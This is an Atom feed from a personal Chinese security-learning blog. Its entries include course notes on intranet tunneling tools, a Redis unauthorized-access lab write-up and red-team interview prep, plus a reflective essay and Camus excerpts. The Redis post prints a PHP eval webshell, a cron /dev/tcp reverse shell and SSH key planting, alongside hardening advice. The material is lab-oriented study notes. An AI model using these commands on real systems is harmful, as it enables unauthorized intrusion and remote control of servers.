<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-25T02:46:26.656Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网穿透之隧道通信</title>
    <link href="http://example.com/2023/03/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    <id>http://example.com/2023/03/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</id>
    <published>2023-03-23T16:00:00.000Z</published>
    <updated>2023-03-25T02:46:26.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>蜗牛学院的内网穿透之隧道通信课程笔记。</p><span id="more"></span><h1 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h1><p>通过Neo-reGeorg隧道通信的原理：(攻击机：kali，跳板机：Windows2016，靶机：win7)</p><ol><li>在kali上下载配置好Neo-reGeorg</li><li>进入Neo-reGeorg目录下，运行命令： <code>python3 neoreg.py generate -k &lt;password&gt;</code></li><li>此时成功生成了各种后缀的tunnel文件，选择合适的（这里以tunnel.php为例）</li><li>继续在当前目录下，执行命令： <code>python3 neoreg.py -k &lt;password&gt; -u http://&lt;跳板机IP&gt;/tunnel.php</code></li><li>在攻击机（kali）上配置代理：<br><code>SOCKS5 Host</code><br><code>127.0.0.1:1080</code></li><li>接下来访问，便可查看靶机（win7）的服务。</li></ol><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>通过SSH隧道通信的原理：（攻击机：kali，跳板机：Centos7,靶机：win7）</p><h2 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h2><ol><li>kali上执行命令： <code>ssh -CfNg -L &lt;攻击机port&gt; &lt;靶机IP:port&gt; root@&lt;跳板机ip&gt;</code></li><li>成功运行命令后，输入跳板机的root密码，即可本地访问 <code>localhost:8879</code> ，实现对靶机IP:port的访问。</li><li>即可成功访问</li></ol><h2 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h2><ol><li>跳板机上运行以下指令：<br><code>ssh -CfNg -R &lt;攻击机的port&gt;:&lt;靶机IP:port&gt; root@&lt;攻击机IP&gt;</code></li></ol><h1 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h1><p>通过EarthWorm工具通信（攻击机：kali，跳板机：Windows2016，靶机：win7）</p><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><ol><li><p>在跳板机上使用命令： <code>ew_for_win_32.exe -s ssocksd -l 1080</code></p></li><li><p>在kali中配置代理：<br>SOCKS5<br>跳板机IP:port</p></li><li><p>成功访问</p></li></ol><h2 id="反弹代理"><a href="#反弹代理" class="headerlink" title="反弹代理"></a>反弹代理</h2><ol><li>先找一台公网服务器，运行命令：<br><code>./ew_for_linux64 -s rcsocks -l 8080 -e 8086</code></li><li>在跳板机上运行命令：<br><code>ew_for_win_32.exe -s rssocks -d &lt;公网IP&gt; -e 8086</code></li><li>在kali上配置代理服务器为：<br>SOCKS5<br><code>&lt;公网IP:8080&gt;</code></li></ol><h1 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h1><p>icmp隧道搭建的场景主要用于在拦截策略关闭了端口，而ICMP协议用于检测网络连通状态，不依赖于端口开放，而防火墙通常会开放此协议。常见的ICMP工具有：icmpsh, pingtunnel, icmptunnel, powershell icmp</p><h2 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h2><p>通过icmpsh工具通信（攻击机：kali，跳板机：Windows2016，靶机：win7）<br><a href="https://github.com/bdamele/icmpsh">下载地址</a></p><ol><li><p>在跳板机上运行icmpsh.exe<br><code>icmpsh.exe -t &lt;攻击机IP&gt;</code></p></li><li><p>关闭本地系统的ICMP响应<br><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1      # 设置0可以还原</code></p></li><li><p>在攻击机上运行命令：<br><code>./icmpsh_m.py &lt;攻击机IP&gt; &lt;跳板机IP&gt;</code></p></li><li><p>再次运行icmpsh.exe<br>重复执行1的步骤</p></li><li><p>成功反弹，攻击机控制跳板机<br>可打开Wireshark检测流量（ICMP不够隐蔽）</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;蜗牛学院的内网穿透之隧道通信课程笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="内网穿透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
    <category term="隧道通信" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    
    
    <category term="隧道通信" scheme="http://example.com/tags/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    
  </entry>
  
  <entry>
    <title>世界的参差</title>
    <link href="http://example.com/2023/03/23/%E4%B8%96%E7%95%8C%E7%9A%84%E5%8F%82%E5%B7%AE/"/>
    <id>http://example.com/2023/03/23/%E4%B8%96%E7%95%8C%E7%9A%84%E5%8F%82%E5%B7%AE/</id>
    <published>2023-03-22T16:00:00.000Z</published>
    <updated>2023-03-27T13:31:56.768Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/ocean.png" alt="world"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>乱花渐欲迷人眼，表象无言惑人心。</p><h1 id="信息差"><a href="#信息差" class="headerlink" title="信息差"></a>信息差</h1><p>最近用搜索引擎找电子书找不到想要的，通过其它方式一下子就找到了。在官方平台上点麦当劳却比某平台上贵十余元。想说说关于信息差的事。</p><p>信息差的例子随处可见，其中著名的一个例子是罗斯柴尔德利用滑铁卢战役的信息差谋取暴利的故事。信息差也被广泛利用，有人靠信息差就能养活自己，有人靠信息差混淆视听。身处互联网时代，网上的信息过于庞杂和碎片化，很难辨别真假和质量。同时，互联网也会根据用户的喜好和习惯，推送相似或者相符的信息，导致用户陷入信息茧房，无法接触到更多元和更广的信息。因此，互联网并没有让人们更加平等和智慧，而是让人们更加孤立和愚昧。</p><p>世界的参差不是第18层地狱与第1层地狱的区别，是地狱与天堂的区别。</p><h1 id="信息的高低"><a href="#信息的高低" class="headerlink" title="信息的高低"></a>信息的高低</h1><p>信息有高低之分，信息的质量会影响我们的认知和决策。如何获取更好的信息，我有几点想法：</p><ol><li>找到源头或接近源头的消息。确保消息传递过程中不会被加工或是扭曲。</li><li>广泛获取信息来源，多方得到信息渠道，留下值得信赖的信息源。</li><li>对于私人公布的信息，很多时候无从考据，但一般更有价值。需要谨慎分辨。</li><li>很多消息本身并不重要，重要的是背后的目的和趋势。</li><li>通常意义上，知道这个信息的人越少，这个信息的在某方面的价值越高。</li></ol><h1 id="表象"><a href="#表象" class="headerlink" title="表象"></a>表象</h1><p>很显然，表象泛滥于世界。无法否认的是，大部分人都沉浸于表象之中，这注定了能够看到背后本质的人会很少。表象如同世界的岩浆幻想，人们只是见到其通红便想象它的炽热，只是见到它的通红便不愿深究其内在。</p><h1 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h1><p>本质是世界运行的规则，知其然更知其所以然，我们只需要知道世界运行的本质，就能从一个个表象中脱离，省去大量无意义的重复活动，提高效率，在更短时间内做更多事。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/ocean.png&quot; alt=&quot;world&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>局外人-摘抄</title>
    <link href="http://example.com/2023/03/23/%E5%B1%80%E5%A4%96%E4%BA%BA-%E6%91%98%E6%8A%84%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2023/03/23/%E5%B1%80%E5%A4%96%E4%BA%BA-%E6%91%98%E6%8A%84%E7%AC%94%E8%AE%B0/</id>
    <published>2023-03-22T16:00:00.000Z</published>
    <updated>2023-03-23T15:34:38.689Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/night2.png" alt="night"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日偶然间，因不想学习，读完了加缪的《局外人》这本书。慕名已久，读了大概两三小时。</p><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>他说他一直在研究我的灵魂，结果发现其中空虚无物。他说我实际上没有灵魂，没有丝毫人性，没有任何一条在人类灵魂中占神圣地位的道德原则，所有这些都与我格格不入。</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>这时，不知是为什么，好像我身上有什么东西爆裂开来，我扯着嗓子直嚷，我叫他不要为我祈祷，我抓住他长袍的领子，把我内心深处的喜怒哀乐猛地一股脑儿倾倒在他头上。他的神气不是那么确信有把握吗？但他的确信不值女人的一根头发，他甚至连自己是否活着都没有把握，因为他干脆就像行尸走肉。而我，我好像是两手空空，一无所有，但我对自己很有把握，对我所有的一切都有把握，比他有把握得多，对我的生命，对我即将来到的死亡，都有把握。是的，我只有这份把握，但至少我掌握了这个真理，正如这个真理抓住了我一样。我以前有理，现在有理，将来永远有理。我以这种方式生活过，我也可能以另外一种方式生活。我干过这，没有干过那，我做过这样的事，而没有做过那样的事。而以后呢？似乎我过去一直等待的就是这一分钟，就是我也许会被判无罪的黎明。没有任何东西，没有任何东西是有重要性的，我很明白是为什么。他也知道是为什么。在我所度过的整个那段荒诞生活期间，一种阴暗的气息从我未来前途的深处向我扑面而来，它穿越了尚未来到的岁月，所到之处，使人们曾经向我建议的所有一切彼此之间不再有高下优劣的差别了，未来的生活也并不比我已往的生活更真切实在。其他人的死，母亲的爱，对我有什么重要？既然注定只有一种命运选中了我，而成千上万的生活幸运儿都像他这位神甫一样跟我称兄道弟，那么他们所选择的生活，他们所确定的命运，他们所尊奉的上帝，对我又有什么重要？他懂吗？大家都是幸运者，世界上只有幸运者。有朝一日，所有的其他人无一例外，都会判死刑，他自己也会被判死刑，幸免不了。这么说来，被指控杀了人，只因在母亲的葬礼上没有哭而被处决，这又有什么重要呢？沙拉玛诺的狗与他的妻子没有什么区别，那个自动机械式的小女人与马松所娶的那个巴黎女人或者希望嫁给我的玛丽，也都没有区别，个个有罪。雷蒙是不是我的同伙与塞莱斯特是不是比他更好，这有什么重要？今天，玛丽是不是又把自己的嘴唇送向另一个新默尔索，这有什么重要？他这个也被判了死刑的神甫，他懂吗？从我未来死亡的深渊里，我喊出了这些话，喊得喘不过气来。但这时，有人把神甫从我手中救了出去，看守们狠狠吓唬我。而神甫却劝他们安静下来，他默默地看了我一会儿。他眼里充满了泪水，他转过身去走开，消失掉了。</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>而我，我现在也感到自己准备好把一切再过一遍。好像刚才这场怒火清除了我心里的痛苦，掏空了我的七情六欲一样，现在我面对着这个充满了星光与默示的夜，第一次向这个冷漠而未温情尽失的世界敞开了我的心扉。我体验到这个世界如此像我，如此友爱融洽，觉得自己过去曾经是幸福的，现在仍然是幸福的。为了善始善终，功德圆满，为了不感到自己属于另类，我期望处决我的那天，有很多人前来看热闹，他们都向我发出仇恨的叫喊声。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>圆满了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/night2.png&quot; alt=&quot;night&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="http://example.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="读书笔记" scheme="http://example.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="http://example.com/2023/03/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://example.com/2023/03/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2023-03-18T16:00:00.000Z</published>
    <updated>2023-03-19T04:23:25.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多种类型的数据结构，如 字符串（strings）， 散列（hashes）， 列表（lists）， 集合（sets）， 有序集合（sorted sets） 与范围查询， bitmaps， hyperloglogs 和 地理空间（geospatial） 索引半径查询。 Redis 内置了 复制（replication），LUA脚本（Lua scripting）， LRU驱动事件（LRU eviction），事务（transactions） 和不同级别的 磁盘持久化（persistence）， 并通过 Redis哨兵（Sentinel）和自动 分区（Cluster）提供高可用性（high availability）。</p><span id="more"></span><h1 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h1><p>测试系统：Centos7.9, 测试版本：Redis7.0.9</p><h2 id="打开Redis的配置文件：redis-conf查看配置情况"><a href="#打开Redis的配置文件：redis-conf查看配置情况" class="headerlink" title="打开Redis的配置文件：redis.conf查看配置情况"></a>打开Redis的配置文件：redis.conf查看配置情况</h2><p><code>vi redis.conf</code></p><ol><li><p>bind<br>默认配置为: <code>bind 127.0.0.1 -::1</code> ，意为仅允许本地连接。<br>测试过程中，要么注释该条语句，要么改为 <code>0.0.0.0</code></p></li><li><p>保护模式<br><code>protected-mode yes</code> 默认开启<br>测试过程中，选择关闭</p></li><li><p>默认密码<br>默认为: <code># requirepass foobared</code> ，能够连接任意客户端。<br>测试过程中，选择不设密码，或设弱密码</p></li></ol><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>客户端和服务端都需要具有Redis<br>攻击机（客户端）：192.168.112.14<br>靶机（服务端）：192.168.112.188</p><ul><li><p>客户端连接服务端正常情况<br>首先服务端需要打开服务。<br>客户端到Redis目录下执行命令（如果有密码）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.112.188 -a &lt;password&gt;</span><br><span class="line">set addr &lt;address&gt;</span><br><span class="line">或</span><br><span class="line">redis-cli.exe -h 192.168.112.188</span><br><span class="line">auth &lt;password&gt;</span><br><span class="line">set addr &lt;address&gt;</span><br></pre></td></tr></table></figure></li><li><p>无密码直接登录，有密码尝试爆破<br>爆破方式：使用“超级弱口令检查工具”，勾选Redis爆破。</p></li></ul><h2 id="利用Redis写Webshell"><a href="#利用Redis写Webshell" class="headerlink" title="利用Redis写Webshell"></a>利用Redis写Webshell</h2><p>config set: 快捷修改redis设置<br>dbfilename: 设置快照的文件名，默认为dump.rdb<br>dir: 默认redis文件保存路径</p><p>首先要猜到网站的目录地址，然后可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。<br>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/ </span><br><span class="line">config set  dbfilename shell.php </span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[cmd]);?&gt;\r\n\r\n&quot; </span><br><span class="line">save</span><br></pre></td></tr></table></figure><ul><li>\r\n\r\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行。</li><li>注意受害方redis是必须是以root的身份运行，不然会报错</li></ul><p>可以在对应文件夹找到相应文件，之后用蚁剑连接即可。</p><h2 id="Redis-写入计划任务"><a href="#Redis-写入计划任务" class="headerlink" title="Redis 写入计划任务"></a>Redis 写入计划任务</h2><p>在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.112.188 -p 6379</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.112.188/7777 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>之后再监听7777端口，即可反弹shell</p><ul><li><strong>注意</strong><br>这个方法只能Centos上使用，Ubuntu上行不通，原因如下：</li></ul><p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件 <code>/var/spool/cron/crontabs/</code>权限必须是600也就是 <code>-rw-------</code> 才会执行，否则会报错 <code>(root) INSECURE MODE (mode 0600 expected)</code> ，而Centos的定时任务文件 <code>/var/spool/cron/</code> 权限644也能执行<br>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错<br>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在 <code>/var/spool/cron/</code><br>Ubuntu定时任务文件在 <code>/var/spool/cron/crontabs/</code></p><h2 id="写ssh-keygen公钥然后使用私钥登录"><a href="#写ssh-keygen公钥然后使用私钥登录" class="headerlink" title="写ssh-keygen公钥然后使用私钥登录"></a>写ssh-keygen公钥然后使用私钥登录</h2><p>条件：服务端存在.ssh目录并且有写入的权限。<br>原理：在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为 <code>/root/.ssh</code> 和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的 <code>/root/.ssh</code> 下生成一个授权的key。<br>攻击机命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 192.168.112.188 -x set xxx</span><br></pre></td></tr></table></figure><p>使用攻击机连接目标机器Redis，设置Redis的备份路径为&#x2F;root&#x2F;.ssh&#x2F;并保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上。<br>在受害机相应路径下传输公钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.112.188 -p 6379</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ssh连接目标机成功!</p><h1 id="Redis未授权访问防御方法"><a href="#Redis未授权访问防御方法" class="headerlink" title="Redis未授权访问防御方法"></a>Redis未授权访问防御方法</h1><p>可以配置redis.conf文件，在redis安装目录下</p><ul><li>默认只对本地开放bind 127.0.0.1</li><li>添加登陆密码：修改redis.conf文件，添加requirepass password</li><li>在需要对外开放的时候修改默认端口（端口不重复就行）port 2333</li><li>配合iptables限制开放</li><li>降权：以低权限运行 Redis 服务（重启redis才能生效）</li><li>禁止使用root权限启动redis服务</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多种类型的数据结构，如 字符串（strings）， 散列（hashes）， 列表（lists）， 集合（sets）， 有序集合（sorted sets） 与范围查询， bitmaps， hyperloglogs 和 地理空间（geospatial） 索引半径查询。 Redis 内置了 复制（replication），LUA脚本（Lua scripting）， LRU驱动事件（LRU eviction），事务（transactions） 和不同级别的 磁盘持久化（persistence）， 并通过 Redis哨兵（Sentinel）和自动 分区（Cluster）提供高可用性（high availability）。&lt;/p&gt;</summary>
    
    
    
    <category term="Redis未授权访问" scheme="http://example.com/categories/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>护网面试准备</title>
    <link href="http://example.com/2023/03/15/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    <id>http://example.com/2023/03/15/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</id>
    <published>2023-03-14T16:00:00.000Z</published>
    <updated>2023-03-19T13:31:55.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写了30道，才发现在网上找的面试题是蓝队的，而且还是流传了好久以前的，我都不知道咋说了。只能说大意了吧。</p><span id="more"></span><h1 id="面试题目"><a href="#面试题目" class="headerlink" title="面试题目"></a>面试题目</h1><h2 id="描述外网打点的流程？"><a href="#描述外网打点的流程？" class="headerlink" title="描述外网打点的流程？"></a>描述外网打点的流程？</h2><ol><li><p>打点的基本认识<br>所谓打点，就是拿到一台机器的shell。打点的目的一般在于利用这台机器作为跳板进入内网。一个红队人员快速打点能力的强悍与否，是区别普通红队和优秀红队的因素之一。</p></li><li><p>打点的基本方法<br>流程：靶标确认–信息收集–漏洞探测–漏洞利用–权限获取<br>其中，信息收集技术含量低，过程可用工具相对优化，但是仍然需要大量劳力。</p></li></ol><p>靶标确认：确认攻击目标范围，防止攻击打偏的情况，例如IP段、子域名等域名信息</p><p>信息收集：信息收集分为基础信息收集与进阶信息收集，基础信息收集包括域名备案信息、真实IP等：进阶信息收集包含靶标端口开放情况、网站目录结构、防护设备信息等。</p><p>漏洞探测：根据信息收集的情况找到合适的漏洞poc进行测试，也可使用漏洞扫描器对靶标进行全方位漏洞探测</p><p>漏洞利用：poc测试完成之后，确认漏洞，使用exp攻击获取部分权限（如数据库权限，webshell权限等）</p><p>权限提升与维持：获取到基础权限之后，可以通过认证绕过、溢出漏洞等本地提权方式获取去靶标的高级权限（管理员权限、系统权限等）</p><p>横向移动：当获取到靶标的最高权限，可以尝试获取靶标所在内网中的其他的机器权限。</p><p><strong>信息收集</strong>大致步骤：<br>（1）得到攻击目标（假设为公司），通过企查查等平台搜索，得到公司和子公司信息。<br>（2）通过公司和子公司信息，通过oneforall，得到子域名。<br>（3）将子域名拿到Eeyes(棱眼)跑一遍，得到子域名所对应的IP和C段信息。（C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。）<br>（4）将对应IP和C段丢给fofa和fscan，fofa能快速得到C段资产信息；fscan能快速扫一遍，顺便打一下常见漏洞。（Fofa 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配。 例如进行漏洞影响范围分析、应用分布统计、应用流行度等。 在渗透测试过程中，Fofa能帮助测试人员快速发现目标资产。）（Fscan是一款内网综合扫描工具，它非常的方便，一键启动，之后完全自动化、并且全方位漏洞扫描。 它支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。）<br>（5）如果fscan爆出漏洞可拿去利用（小概率）<br>（6）查看通过fofa得到的资产，可配合ehole的指纹识别来快速筛选。通过筛选敏感资产（如shiro, fastjson等）直接能够反序列化getshell的资产（小概率）。（EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。 EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。）<br>（7）获得了登陆后台&#x2F;用户登录&#x2F;注册&#x2F;管理员等交互类型的资产后，可以尝试进行反序列化漏洞&#x2F;文件上传漏洞&#x2F;SQL注入等漏洞。<br>（8）对各种登录系统尝试弱口令&#x2F;SQL注入攻击，弱口令能登入后台就找上传点，SQL注入建议xray+burp检测，有戏再用sqlmap。fofa搜关键字，title&#x3D;”单位名”等，可自行穿插灵活使用，有时有效。弱口令登云桌面(horizen,vdi等)拿到shell的方式可尝试（小概率）。<br>（9）弱口令如果爆不出账号密码，考虑上 网盘&#x2F;GitHub&#x2F;社工库&#x2F;泄露公开库 搜对应人员信息，看是否有效。<br>（10）若无用，则查看 公众号&#x2F;app&#x2F;小程序 的信息。<br>（11）若无用，开始使用 域传送&#x2F;备案号&#x2F;IP反查网站&#x2F;ssl证书&#x2F;Google 来搜C段。<br>（12）若无用，使用 dirmap&#x2F;dirsearch 对可疑网站进行目录爆破。<br>（13）若无用，发钓鱼邮件。（网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行诈骗活动，受骗者往往会泄露自己的<br>财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售<br>商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达5%的人都会对这些骗局做出响<br>应 。）<br>（14）若无用，申请近源渗透。（近源渗透通俗而言就是通过乔装、社工等方式实地物理侵入企业办公区域，通过其内部各种潜在攻击面（如Wi-Fi网络、RFID门禁、暴露的有线网口、USB接口等）获得“战果”，最后以隐秘的方式将评估结果带出上报，由此证明企业安全防护存在漏洞。）</p><p>可能用到的工具：</p><ul><li>ENScan: 企业信息查询工具。</li><li>Netcraft,站长工具：网站基本信息收集</li><li>Oneforall: 子域名收集工具</li><li>水泽：信息收集自动化工具</li><li>Wappalyzer: 网站技术识别工具。</li><li>Eeyes: 快速筛选真实IP并整理为C段</li><li>Goby: 网络安全测试工具，由赵武打造，它能对一个目标企业梳理最全的攻击面信息，能够快速的从一个验证入口点，切换到横向。</li><li>FOFA: 网络空间资产搜索引擎</li><li>Fscan: 是一款内网综合扫描工具</li><li>Masscan：一个批量端口扫描器</li><li>nmap：端口扫描工具</li><li>ARL资产安全灯塔：快速侦察与目标关联的资产工具</li><li>EHole: 是一款对资产中重点系统指纹识别的工具</li><li>xray: 用于SQL注入检测</li></ul><ol start="3"><li>打点的技术区分线<br>漏洞利用是否成功。<br>失败原因有：出网却无法反弹shell，能反弹shell却时不时断开，能写能连内存马但是无法下载或上传较大文件，其它都成功但执行特定命令就会失败……</li></ol><h2 id="举几个-FOFA-在外网打点过程中的使用小技巧"><a href="#举几个-FOFA-在外网打点过程中的使用小技巧" class="headerlink" title="举几个 FOFA 在外网打点过程中的使用小技巧"></a>举几个 FOFA 在外网打点过程中的使用小技巧</h2><ul><li>后台挖掘：title&#x3D;”后台” &amp;&amp; body&#x3D;”password” &amp;&amp; host&#x3D;”x.cn”</li><li>子域名：title !&#x3D; ‘404’ &amp;&amp; title!&#x3D;’302’ &amp;&amp; host&#x3D;’x.cn’</li><li>C段：ip&#x3D;’x.x.x.x&#x2F;24’ &amp;&amp; host&#x3D;’x.cn’</li><li>框架特征：body&#x3D;’icon-spring-boot-admin.svg’</li><li>漏洞：body&#x3D;’index&#x2F;of’ [列目录漏洞]</li></ul><h2 id="如何识别CDN？"><a href="#如何识别CDN？" class="headerlink" title="如何识别CDN？"></a>如何识别CDN？</h2><ol><li><p>CDN简介<br>CDN全称是Content Delivery Network，即内容分发网络。其基本思想是尽可能避开网络上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。<br>CDN的关键技术主要有内容存储和分发技术。</p></li><li><p>识别CDN的方法<br>（1）ping目标主域<br>如果ping的名称和返回信息的名称不同，可知是使用了CDN。<br>（2）nslookup使用不同的DNS域名解析<br>通过不同的DNS域名解析同一域名，如果解析结果不同，则很可能使用了CDN服务<br>比如：<br><code>nslookup www.jd.com 8.8.8.8</code><br><code>nslookup www.jd.com 